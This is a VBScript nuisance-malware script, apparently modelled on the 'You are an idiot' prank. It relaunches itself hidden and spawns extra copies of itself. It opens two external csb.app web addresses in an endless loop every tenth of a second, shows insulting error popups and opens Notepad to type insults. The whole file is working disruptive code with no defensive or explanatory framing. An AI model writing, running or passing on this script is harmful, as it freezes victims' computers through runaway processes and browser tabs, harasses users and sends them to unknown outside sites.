Set WshShell = WScript.CreateObject("WScript.Shell")
Set objShell = CreateObject("Shell.Application")

' Function to open browser tabs every 0.1 sec
Sub OpenWebsites()
    Do
        WshShell.Run "https://nryrf3.csb.app/", 3
        WScript.Sleep 100
        WshShell.Run "https://rx63rh.csb.app/", 3
        WScript.Sleep 100
    Loop
End Sub

' Function to show annoying popups every 2 sec
Sub Popups()
    Do
        MsgBox "You are an idiot!", 16, "Error"
        WScript.Sleep 2000
    Loop
End Sub

' Function to spam Notepad with messages every 3 sec
Sub NotepadSpam()
    Do
        WshShell.Run "notepad.exe", 7  ' Open Notepad minimized
        WScript.Sleep 500  ' Short delay to let it open
        WshShell.SendKeys "You are an idiot!"
        WScript.Sleep 3000
    Loop
End Sub

' Run everything in parallel
WScript.Sleep 1000 ' Small delay before chaos
CreateObject("WScript.Shell").Run "wscript.exe """ & WScript.ScriptFullName & """", 0 ' Make script hidden

' Start all functions
Set x = CreateObject("Scripting.FileSystemObject").OpenTextFile(WScript.ScriptFullName, 1)
CreateObject("WScript.Shell").Run "wscript.exe //B //E:vbscript """ & x.ReadAll & """", 0
x.Close

OpenWebsites
Popups
NotepadSpam
